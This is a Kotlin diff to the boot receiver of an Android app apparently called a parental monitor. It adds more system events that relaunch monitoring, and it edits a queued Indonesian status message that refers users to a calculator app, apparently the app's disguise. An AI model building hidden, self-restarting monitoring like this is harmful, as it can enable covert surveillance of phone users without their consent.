@@ -18,6 +18,8 @@ class BootReceiver : BroadcastReceiver() {
             Intent.ACTION_BOOT_COMPLETED,
             Intent.ACTION_MY_PACKAGE_REPLACED,
             Intent.ACTION_USER_UNLOCKED,
+            Intent.ACTION_USER_PRESENT,
+            Intent.ACTION_PACKAGE_RESTARTED,
             ACTION_QUICKBOOT_POWERON,
             ACTION_HTC_QUICKBOOT
         )
@@ -43,6 +45,10 @@ class BootReceiver : BroadcastReceiver() {
         if (intent.action == Intent.ACTION_MY_PACKAGE_REPLACED) {
             val updatedPart = intent.data?.schemeSpecificPart
             if (updatedPart != null && updatedPart != context.packageName) return
+        }
+        if (intent.action == Intent.ACTION_PACKAGE_RESTARTED) {
+            val restartedPart = intent.data?.schemeSpecificPart
+            if (restartedPart != null && restartedPart != context.packageName) return
         }
         if (intent.action == Intent.ACTION_USER_UNLOCKED) {
             val nowUnlock = android.os.SystemClock.elapsedRealtime()
@@ -173,7 +179,7 @@ class BootReceiver : BroadcastReceiver() {
                 val lastNotice = meta.getLong("reboot_notice_elapsed", 0L)
                 if (lastNotice == 0L || nowBoot < lastNotice || nowBoot - lastNotice >= 3_600_000L) {
                     meta.edit().putLong("reboot_notice_elapsed", nowBoot).apply()
-                    com.redeye.parentalmonitor.data.MessageQueue.getInstance(context).addMessage("🔄 HP habis reboot, monitoring coba jalan lagi. Bila sepi, buka aplikasi kalkulator.")
+                    com.redeye.parentalmonitor.data.MessageQueue.getInstance(context).addMessage("🔄 Monitoring coba jalan lagi. Bila sepi, buka aplikasi kalkulator.")
                     MessageScheduler.scheduleMessageSend(context)
                 }
             } catch (_: Exception) {
